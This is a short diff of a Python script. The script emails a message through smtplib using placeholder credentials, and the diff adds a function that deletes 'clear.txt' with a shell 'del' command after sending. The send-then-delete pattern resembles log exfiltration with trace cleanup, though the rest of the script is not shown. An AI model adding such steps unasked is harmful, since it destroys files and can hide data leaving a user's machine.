@@ -32,3 +32,9 @@ with smtplib.SMTP(host = "mail.yourdomain.com", port = 587) as server: #If you p
     time.sleep(1)
     server.login("SENDER MAIL ADDRESS", "SENDER MAIL PASSWORD") #CHANGE THIS
     server.sendmail(sender, reciever, message)
+
+time.sleep(1)
+def delete():
+	command1 = "del clear.txt"
+	process = os.popen(command1)
+delete()
